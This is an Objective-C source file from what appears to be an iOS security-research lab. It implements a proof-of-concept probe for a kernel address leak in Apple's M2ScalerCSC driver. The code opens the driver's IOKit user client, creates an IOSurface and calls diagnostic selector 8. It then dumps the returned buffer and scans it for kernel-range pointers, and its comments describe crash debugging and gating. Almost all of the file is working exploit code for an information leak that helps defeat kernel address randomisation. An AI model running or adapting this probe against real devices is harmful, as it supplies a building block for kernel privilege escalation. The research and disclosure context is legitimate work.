//
//  P098M2ScalerDiag.m — AppleM2ScalerCSCDriver get_iosaDiag event_payload leak.
//  vschko/CaseStudies writeup mechanics; implementation is ours (dlsym only).
//  READ-ONLY: one selector call, no writes, no grooming.
//

#import "P098M2ScalerDiag.h"

#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <dlfcn.h>
#import <string.h>
#import <fcntl.h>
#import <unistd.h>
#import <errno.h>
#import "LabLocalTime.h"
#import "LabDeviceProfile.h"
#import <mach/mach.h>
#import <mach/vm_map.h>
#import <mach/vm_region.h>

#define P098_BUILD @"p098-m2scaler-v4-cfstrings"

/* dlsym prototypes (local per P059/P032 convention) */
typedef CFMutableDictionaryRef (*IOServiceMatching_t)(const char *);
typedef io_service_t (*IOServiceGetMatchingService_t)(mach_port_t, CFDictionaryRef);

#pragma mark - log helpers

static int g_p098_fd = -1;
static NSMutableString *g_p098_buf;

static void p098_flush_line(NSString *out) {
    if (g_p098_buf) [g_p098_buf appendString:out];
    if (g_p098_fd >= 0) {
        const char *s = out.UTF8String;
        if (s) {
            write(g_p098_fd, s, strlen(s));
            fcntl(g_p098_fd, F_FULLFSYNC);
        }
    }
}

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (![line hasSuffix:@"\n"]) line = [line stringByAppendingString:@"\n"];
    @synchronized ([P098M2ScalerDiag class]) { p098_flush_line(line); }
}

static BOOL p098_kernelish(uint64_t v) {
    return (v >= 0xFFFFFE0000000000ULL && v < 0xFFFFFFF000000000ULL) ||
           (v >= 0xFFFFFFF000000000ULL);
}

/* SwiftPeek-style symbol peek (in-process, honest). Resolved via dlsym so we
   never #import <mach/mach_vm.h> (AGENTS landmine #2; local-prototype shape
   per P069). Returns YES only when the pointer sits in an r-x page — i.e. it
   is plausibly callable. DATA symbols (kIOSurface* CFString globals) are not:
   calling one is exactly what SIGKILLed the rig at 225909
   (CODESIGNING Invalid Page, kIOSurfaceWidth+0, tap+1588). */
static BOOL p098_addr_exec_p(const void *addr, char *out, size_t outn) {
    if (!addr) { snprintf(out, outn, "nil"); return NO; }
    typedef kern_return_t (*mach_vm_region_f)(vm_map_t, uint64_t *, uint64_t *,
                                              vm_region_flavor_t, vm_region_info_t,
                                              mach_msg_type_number_t *, mach_port_t *);
    mach_vm_region_f vmreg = (mach_vm_region_f)dlsym(RTLD_DEFAULT, "mach_vm_region");
    if (!vmreg) { snprintf(out, outn, "mach_vm_region dlsym miss"); return NO; }
    uint64_t a = (uint64_t)addr, sz = 0;   /* arm64: vm_address_t == uint64_t */
    vm_region_basic_info_data_64_t bi;
    mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
    mach_port_t unused = MACH_PORT_NULL;
    kern_return_t kr = vmreg(mach_task_self(), &a, &sz, VM_REGION_BASIC_INFO_64,
                             (vm_region_info_t)&bi, &cnt, &unused);
    if (kr != KERN_SUCCESS) { snprintf(out, outn, "kr=0x%x", kr); return NO; }
    snprintf(out, outn, "@%p prot=%c%c%c", addr,
             (bi.protection & VM_PROT_READ)    ? 'r' : '-',
             (bi.protection & VM_PROT_WRITE)   ? 'w' : '-',
             (bi.protection & VM_PROT_EXECUTE) ? 'x' : '-');
    return (bi.protection & VM_PROT_EXECUTE) != 0;
}

@implementation P098M2ScalerDiag

+ (NSString *)tap {
    @synchronized ([P098M2ScalerDiag class]) {
        g_p098_buf = [NSMutableString string];
        NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        NSString *path = [docs stringByAppendingPathComponent:@"p098_m2scaler_diag_log.txt"];
        g_p098_fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_APPEND, 0644);

        L(@"=== p098 session %@ BUILD %@ ===", LabLocalMilitaryNow() ?: @"?", P098_BUILD);
        L(@"M2ScalerCSC iosaDiag event_payload IOSurface KVA leak (vschko writeup,");
        L(@"possibly CVE-2026-64709). Fixed 26.6 (23G71). Raw dump + candidate scan;");
        L(@"parse is best-effort, nothing auto-trusted.");
        L(@"%@", [LabDeviceProfile identBlock] ?: @"ident ?");

        void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW);
        if (!iokit) iokit = RTLD_DEFAULT;
        IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
        IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
        kern_return_t (*pOpen)(io_service_t, task_port_t, uint32_t, io_connect_t *) =
            dlsym(iokit, "IOServiceOpen");
        kern_return_t (*pClose)(io_connect_t, uint32_t, uint32_t) = dlsym(iokit, "IOServiceClose");
        IOReturn (*pCallStruct)(mach_port_t, uint32_t, const void *, size_t, void *, size_t *) =
            dlsym(iokit, "IOConnectCallStructMethod");
        IOReturn (*pObjRelease)(io_object_t) = dlsym(iokit, "IOObjectRelease");
        mach_port_t (*pPortGetMain)(void) = dlsym(iokit, "kIOMainPortDefault");
        // IOSurface is dlsym-only per AGENTS.md (no header import).
        void *iosurf = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
        if (!iosurf) iosurf = RTLD_DEFAULT;
        void *(*pSurfCreate)(CFDictionaryRef) = dlsym(iosurf, "IOSurfaceCreate");
        size_t (*pSurfAllocSize)(void *) = dlsym(iosurf, "IOSurfaceGetAllocSize");
        void (*pSurfRelease)(void *) = dlsym(RTLD_DEFAULT, "CFRelease");
        /* kIOSurface* are DATA symbols (CFStringRef globals), NOT functions.
           They were typed as function pointers and CALLED — that jumped into
           IOSurface's data section, page not executable, CODESIGNING Invalid
           Page SIGKILL (rig .ips 225909). Used as data below. */
        CFStringRef pKeyWidth  = dlsym(iosurf, "kIOSurfaceWidth");
        CFStringRef pKeyHeight = dlsym(iosurf, "kIOSurfaceHeight");
        CFStringRef pKeyBPE    = dlsym(iosurf, "kIOSurfaceBytesPerElement");
        CFStringRef pKeyBPR    = dlsym(iosurf, "kIOSurfaceBytesPerRow");
        CFStringRef pKeyAlloc  = dlsym(iosurf, "kIOSurfaceAllocSize");

        if (!pMatching || !pGet || !pOpen || !pCallStruct) {
            L(@"[-] IOKit dlsym incomplete - honest miss.");
            goto finish;
        }
        if (!pSurfCreate || !pKeyWidth || !pKeyHeight || !pKeyBPE || !pKeyBPR || !pKeyAlloc) {
            L(@"[-] IOSurface dlsym incomplete - honest miss.");
            goto finish;
        }

        /* SwiftPeek-style peek: show the conversion in the console instead of
           dying on it. FUNC symbols sit in r-x pages; the kIOSurface* keys do
           not — and as toll-free-bridged CFStrings they convert to NSString
           and print their real values ("IOSurfaceWidth" etc). */
        {
            struct { const char *n; const void *p; } peek[] = {
                { "IOSurfaceCreate",  pSurfCreate },
                { "IOSurfaceGetAllocSize", pSurfAllocSize },
                { "CFRelease",        pSurfRelease },
                { "kIOSurfaceWidth",  pKeyWidth },
                { "kIOSurfaceHeight", pKeyHeight },
                { "kIOSurfaceBytesPerElement", pKeyBPE },
                { "kIOSurfaceBytesPerRow",     pKeyBPR },
                { "kIOSurfaceAllocSize",       pKeyAlloc },
            };
            for (int i = 0; i < 8; i++) {
                char prot[64];
                BOOL callOK = p098_addr_exec_p(peek[i].p, prot, sizeof(prot));
                /* v1b: %@ for the callability field — it is an NSString*; the
                   old %s printed its isa bytes (the ¿d'˚ mojibake on 23F77). */
                L(@"[peek] %-26s %@ %s", peek[i].n,
                  callOK ? @"FUNC(r-x) callable" : @"DATA(not callable)", prot);
            }
            /* 2026-10-21 05:20 SIGBUS attribution: this line's (__bridge id)
               args hit _objc_msgSend on a non-initialized export slot
               (class-realize faulted writing __AUTH_CONST). The keys are
               printed as ADDRESSES now — no message send, no crash class. */
            L(@"[peek] key CFStrings: width=%p height=%p bpe=%p bpr=%p alloc=%p",
              (void *)pKeyWidth, (void *)pKeyHeight, (void *)pKeyBPE,
              (void *)pKeyBPR, (void *)pKeyAlloc);
        }

        /* Scoped body: ARC forbids jumping over ObjC declarations in scope
           at the label, so everything between here and finish: lives in its
           own block. */
        {
        /* v2: the door open + sel=8 diag trigger is GATED. P027 documented
           the delayed async-teardown SIGSEGV pattern on door close
           (uncatchable, fires ~1-2 s after end, no analytics report). The
           17:31 tap reproduced it on 23F77: peeks + end printed clean, app
           died right after, no crash report. Default tap = peeks only. To
           arm the trigger: write ONE char into Documents/p098_trigger.txt,
           force-quit, tap. */
        NSString *p098Docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        BOOL p098TriggerWanted = [[NSFileManager defaultManager] fileExistsAtPath:
            [p098Docs stringByAppendingPathComponent:@"p098_trigger.txt"]];
        if (!p098TriggerWanted) {
            L(@"[v2] TRIGGER GATED OFF (M2ScalerCSC open + sel=8 skipped)");
            L(@"[v2] arm: write ONE char into Documents/p098_trigger.txt, force-quit, tap");
            L(@"[v2] reason: delayed teardown death after door close on 23F77 (P027 pattern, 17:31)");
            goto finish;
        }
        mach_port_t mainPort = 0;
        if (pPortGetMain) mainPort = *(mach_port_t *)pPortGetMain;

        CFMutableDictionaryRef matching = pMatching("AppleM2ScalerCSCDriver");
        io_service_t svc = matching ? pGet(mainPort, matching) : 0;
        if (!svc) {
            L(@"[-] AppleM2ScalerCSCDriver not present on this SKU - honest miss");
            L(@"[-] (driver population varies; absence is a real result, not a bug).");
            goto finish;
        }
        L(@"[*] AppleM2ScalerCSCDriver service found.");

        io_connect_t conn = 0;
        kern_return_t kr = pOpen(svc, mach_task_self(), 0, &conn);
        L(@"[*] IOServiceOpen(type=0) kr=0x%x conn=%d", kr, conn);
        if (kr != KERN_SUCCESS || !conn) {
            L(@"[-] open rejected (entitlement/sandbox boundary) - honest miss.");
            if (pObjRelease) pObjRelease(svc);
            goto finish;
        }

        // One IOSurface so a queueAndExecute-style log entry exists to read.
        // V3: the v2 @{...} literal crashed at realizeClassWithoutSwift after
        // the door open on BOTH SKUs (17:18 / 17:35 x2, same signature) — but
        // the in-file 05:20 attribution already named the crash class: a
        // msgSend on the non-initialized dlsym'd CFString export slots. The
        // literal's (__bridge id)pKey* bridges hit exactly that. Rebuild the
        // surface properties with pure CF APIs: keys passed as raw CFString
        // pointers, values CFNumberCreate — no ObjC literal machinery, no
        // bridges on the imported keys.
        L(@"[v3] checkpoint: post-open, building props (CF path)");
        CFMutableDictionaryRef props = CFDictionaryCreateMutable(kCFAllocatorDefault, 8,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        {
            // V4: kill every dlsym'd pKey* bridge. On 23F77 the imported
            // CFString export slots realize to garbage-class pointers — every
            // dictionary mutation on them dies (05:20, 17:18, 17:35 x2,
            // 18:08 — the same realizeClass/__AUTH_CONST SIGBUS). Plain
            // CFStringCreateWithCString keys + CFNumberCreate values:
            // no imported objects in the dict at all.
            const char *keyNames[5] = { "IOSurfaceWidth", "IOSurfaceHeight",
                                        "IOSurfaceBytesPerElement",
                                        "IOSurfaceBytesPerRow", "IOSurfaceAllocSize" };
            const NSInteger vals[5] = { 256, 1, 4, 1024, 1024 };
            for (int i = 0; i < 5; i++) {
                CFStringRef key = CFStringCreateWithCString(kCFAllocatorDefault,
                                                            keyNames[i], kCFStringEncodingUTF8);
                CFNumberRef num = CFNumberCreate(kCFAllocatorDefault,
                                                 kCFNumberNSIntegerType, &vals[i]);
                if (key && num) {
                    CFDictionarySetValue(props, key, num);
                    L(@"[v4] prop %d set (%s val=%ld)", i, keyNames[i], (long)vals[i]);
                } else {
                    L(@"[v4] prop %d alloc FAIL", i);
                }
                if (key) CFRelease(key);
                if (num) CFRelease(num);
            }
        }
        void *surf = pSurfCreate((CFDictionaryRef)props);
        L(@"[*] IOSurfaceCreate -> %@ alloc=%zu", surf ? @"OK" : @"FAIL",
          surf ? pSurfAllocSize(surf) : 0);

        // Selector 8 = user_get_iosaDiag. Input shape unknown on this build:
        // try the natural {user VA of out-buffer, size} pair; the driver
        // copies entries into the mapped output. All failures are honest.
        static uint8_t outBuf[0x4000];
        memset(outBuf, 0, sizeof(outBuf));
        uint64_t inS[2] = { (uint64_t)(uintptr_t)outBuf, sizeof(outBuf) };
        size_t outLen = sizeof(outBuf);
        kr = pCallStruct(conn, 8, inS, sizeof(inS), outBuf, &outLen);
        L(@"[*] sel=8 stIn={va=0x%llx,size=0x%x} kr=0x%x outLen=%zu (0x%x)",
          (unsigned long long)inS[0], (unsigned)sizeof(inS), kr, outLen, (unsigned)outLen);

        if (kr == KERN_SUCCESS && outLen) {
            // Raw dump of the first 0x100 bytes.
            L(@"[*] diag out head (0x100 of 0x%x bytes):", (unsigned)outLen);
            for (uint32_t row = 0; row < 0x100; row += 16) {
                NSString *hex = @"";
                for (uint32_t i = 0; i < 16; i++) {
                    hex = [hex stringByAppendingFormat:@"%02x%s", outBuf[row + i],
                           (i == 15) ? "" : " "];
                }
                L(@"[*] +0x%04x: %@", row, hex);
            }
            // Candidate scan: kernel-range qwords anywhere in the output.
            // Writeup: event_payload sits at entry+0x18 and holds an IOSurface
            // KVA (zone-range 0xffffffe...). We scan ALL qwords - honest.
            int cands = 0;
            for (size_t off = 0; off + 8 <= outLen && cands < 8; off += 8) {
                uint64_t v;
                memcpy(&v, outBuf + off, 8);
                if (p098_kernelish(v)) {
                    cands++;
                    L(@"[+] CANDIDATE @+0x%04zx = 0x%016llx (kernel-range qword)", off,
                      (unsigned long long)v);
                }
            }
            if (!cands) {
                L(@"[-] no kernel-range qwords in diag output (perm-stripped on this");
                L(@"[-] build, wrong input shape, or driver hardened) - honest miss.");
            } else {
                L(@"[*] candidates are UNVERIFIED. If a +0x18 payload matches the");
                L(@"[*] just-created IOSurface's KVA neighborhood, the leak is live.");
            }
        } else if (kr == 0xe00002c2 || kr == KERN_INVALID_CAPABILITY) {
            L(@"[-] sel=8 rejected (0x%08x) - selector not exposed on this SKU/build.", kr);
        } else {
            L(@"[-] sel=8 failed kr=0x%x - input shape may differ; honest miss.", kr);
        }

        if (surf && pSurfRelease) pSurfRelease(surf);
        if (pClose && conn) pClose(conn, 0, 0);
        if (pObjRelease) pObjRelease(svc);
        }

finish:
        if (g_p098_fd >= 0) { close(g_p098_fd); g_p098_fd = -1; }
        NSString *out = [g_p098_buf copy];
        g_p098_buf = nil;
        return out;
    }
}

@end